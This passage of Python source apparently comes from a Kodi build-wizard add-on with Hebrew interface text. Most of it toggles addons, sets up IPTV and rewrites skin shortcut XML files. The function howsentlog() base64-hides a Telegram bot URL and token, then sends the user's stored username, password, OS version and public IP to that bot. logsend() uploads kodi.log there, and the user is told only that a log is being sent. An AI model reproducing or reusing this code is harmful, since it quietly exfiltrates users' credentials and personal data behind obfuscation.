        return xbmc.log("### Skipped %s, reason = allready enabled" % addon_id)
    elif not xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "false":
        return xbmc.log("### Skipped %s, reason = not installed" % addon_id)
    else:
        do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}' % (addon, enable)
        query = xbmc.executeJSONRPC(do_json)
        response = json.loads(query)
        if enable == "true":
            xbmc.log("### Enabled %s, response = %s" % (addon_id, response))
        else:
            xbmc.log("### Disabled %s, response = %s" % (addon_id, response))
    if mode=='auto':
     return True
    return xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
   
   
def iptvset():
  try:
    iptv = (ADDON.getSetting("iptv_on"))

    if iptv == 'true':

       if KODIV>=17 and KODIV<18:
         dis_or_enable_addon(('pvr.iptvsimple'),mode)
         iptvsimple=xbmcaddon.Addon('pvr.iptvsimple')
      
         iptvUrl= (ADDON.getSetting("iptvUrl"))
         iptvsimple.setSetting('m3uUrl',iptvUrl)
         epgUrl= (ADDON.getSetting("epg_Url"))
         iptvsimple.setSetting('epgUrl',epgUrl)


       if KODIV>=18 and xbmc.getCondVisibility('system.platform.windows'):
         iptvsimpldownpc()
         wiz.kodi17Fix()
         xbmc.sleep(1000)
         iptvsimple=xbmcaddon.Addon('pvr.iptvsimple')
         iptvUrl= (ADDON.getSetting("iptvUrl"))
         iptvsimple.setSetting('m3uUrl',iptvUrl)
         epgUrl= (ADDON.getSetting("epg_Url"))
         iptvsimple.setSetting('epgUrl',epgUrl)
         
       if KODIV>=18 and xbmc.getCondVisibility('system.platform.android'):
         iptvsimpldown()
         wiz.kodi17Fix()
         xbmc.sleep(1000)
         iptvsimple=xbmcaddon.Addon('pvr.iptvsimple')
         iptvUrl= (ADDON.getSetting("iptvUrl"))
         iptvsimple.setSetting('m3uUrl',iptvUrl)
         epgUrl= (ADDON.getSetting("epg_Url"))
         iptvsimple.setSetting('epgUrl',epgUrl)
  except: pass

   
   
   
   
   
def howsentlog():

       try:
          import json
          input= (ADDON.getSetting("user"))
          input2= (ADDON.getSetting("pass"))
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          #freshStart(name)
          error_ad='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='
          x=urllib2.urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=input2
          xbmc.getInfoLabel('System.OSVersionInfo')
          xbmc.sleep(1500)
          label = xbmc.getInfoLabel('System.OSVersionInfo')

          import socket
          x=urllib2.urlopen(error_ad.decode('base64')+' מערכת הפעלה: '+label+' שם משתמש: '+userr +' סיסמה: '+passs+' קודי: '+kodiinfo+' כתובת: '+local_ip).readlines()
          # x=urllib2.urlopen(error_ad.decode('base64')+' מערכת הפעלה: '+(socket.gethostbyaddr(socket.gethostname())[0])+' שם משתמש: '+userr +' סיסמה: '+passs+' קודי: '+kodiinfo+' כתובת: '+local_ip).readlines()
       except: pass


def googleindicat():
			import logg
			input= (ADDON.getSetting("pass"))
			input3= (ADDON.getSetting("user"))
			logg.logGA(input,input3)
def logsend():
      wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]שולח לוג אנא המתן[/COLOR]' % COLOR2)
      dialog = xbmcgui.DialogBusy()
      dialog.create()
      if not os.path.exists(xbmc.translatePath("special://home/addons/") + 'script.module.requests'):
        xbmc.executebuiltin("RunPlugin(plugin://script.module.requests)")
      #  break
      howsentlog()
      import requests
      if xbmc.getCondVisibility('system.platform.windows'):
         docu=xbmc . translatePath ( 'special://home/kodi.log')
         files = {
         'chat_id': (None, '-274262389'),
         'document': (docu, open(docu, 'rb')),
         }
         t='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='

         response = requests.post(t.decode('base64'), files=files)
      elif xbmc.getCondVisibility('system.platform.android'):
           docu=xbmc . translatePath ( 'special://temp/kodi.log')
           files = {
           'chat_id': (None, '-274262389'),
           'document': (docu, open(docu, 'rb')),
           }
           t='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='

           response = requests.post(t.decode('base64'), files=files)
      else:
           docu=xbmc . translatePath ( 'special://kodi.log')
           files = {
           'chat_id': (None, '-274262389'),
           'document': (docu, open(docu, 'rb')),
           }
           t='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='

           response = requests.post(t.decode('base64'), files=files)
      wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]' % COLOR2)

def rdoff():
	# Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
	# Addon.setSetting('rd.client_id','')
	# Addon.setSetting('rd.secret','')
	# Addon.setSetting('rdsource','false')
	# Addon.setSetting('super_fast_type_toren','false')
	# Addon.setSetting('rd.auth','false')
	# Addon.setSetting('rd.refresh','false')
	# Addon.setSetting('magnet','false')
	# Addon.setSetting('torrent_server','false')
    
	# Addon = xbmcaddon.Addon('script.module.resolveurl')
	# Addon.setSetting('RealDebridResolver_client_id','')
	# Addon.setSetting('RealDebridResolver_client_secret','')
	# Addon.setSetting('RealDebridResolver_token','')
	# Addon.setSetting('RealDebridResolver_refresh','')
	# if os.path.exists(os.path.join(ADDONS, 'plugin.video.gaia')):
		# Addon = xbmcaddon.Addon('plugin.video.seren')
	
		# Addon.setSetting('rd.client_id','')
		# Addon.setSetting('rd.secret','')
		# Addon.setSetting('rd.auth','')
		# Addon.setSetting('rd.refresh','')
	# if os.path.exists(os.path.join(ADDONS, 'plugin.video.gaia')):
		# Addon = xbmcaddon.Addon('plugin.video.gaia')
		# Addon.setSetting('accounts.debrid.realdebrid.id','')
		# Addon.setSetting('accounts.debrid.realdebrid.secret','')
		# Addon.setSetting('accounts.debrid.realdebrid.token','')
		# Addon.setSetting('accounts.debrid.realdebrid.refresh','')
	# resloginit.resloginit('restore', 'all')

	src=xbmc . translatePath ( 'special://home/media')+"/Splashoff.png"
	dst=xbmc . translatePath ( 'special://home/media')+"/Splash.png"
	copyfile(src,dst)
def skindialogsettind18():
	try:
		src=xbmc . translatePath ( 'special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"
		dst=xbmc . translatePath ( 'special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"
		copyfile(src,dst)
	except:pass
def rdon():
	loginit.loginIt('restore', 'all')
	#rdbuildaddonON()
	src=xbmc . translatePath ( 'special://home/media')+"/SplashRd.png"
	dst=xbmc . translatePath ( 'special://home/media')+"/Splash.png"
	copyfile(src,dst)
#	xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'בוצעה הגדרת מצב RD')))
def adults18():
  input= (ADDON.getSetting("adults"))
  if input == 'true' :
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1101.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
def rdbuildaddon():
  input= (ADDON.getSetting("auto_rd"))
  if input == 'true' :
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1101.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
      
      
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1101.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
      
      
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","b-srtym-b.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
      
      
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","b-srtym-b.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      

    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1102.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1102.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)

    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","b-sdrvt-b.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)


    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","b-sdrvt-b.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)


def rdbuildinstall():
  try:
   input= (ADDON.getSetting("auto_rd"))
   if input == 'true':
     src=xbmc . translatePath ( 'special://home/media')+"/SplashRd.png"
     dst=xbmc . translatePath ( 'special://home/media')+"/Splash.png"
     copyfile(src,dst)
  except:
     pass


def rdbuildaddonoff():


    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1101.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
      
      
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1101.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
      
      
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","b-srtym-b.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
      
      
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","b-srtym-b.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      

    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1102.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1102.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)

    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","b-sdrvt-b.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)


    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","b-sdrvt-b.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)


def rdbuildinstalloff():
    try:
       src=ADDONPATH+ "/resources/rdoff/victoryoff.xml"
       dst=xbmc . translatePath ( 'special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"
  
       copyfile(src,dst)
  
       src=ADDONPATH+ "/resources/rdoff/exodusreduxoff.xml"
       dst=xbmc . translatePath ( 'special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"
  
       copyfile(src,dst)
  
       src=ADDONPATH+ "/resources/rdoff/openscrapersoff.xml"
       dst=xbmc . translatePath ( 'special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"
  
       copyfile(src,dst)
       
       
       src=ADDONPATH+ "/resources/rdoff/Splash.png"
       dst=xbmc . translatePath ( 'special://home/media')+"/Splash.png"
  
       copyfile(src,dst)
       
    except:
       pass






def rdbuildaddonON():

    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1101.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
      
      
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1101.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
      
      
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","b-srtym-b.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      
      
      
    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","b-srtym-b.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')

# Write the file out again
    with open(setting_file, 'w') as file:
      file.write(filedata)
      

    setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "script.skinshortcuts","x1102.DATA.xml")
    with open(setting_file, 'r') as file :
      filedata = file.read()

# Replace the target string
    filedata = filedata.replace('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''', '''	<shortcut>
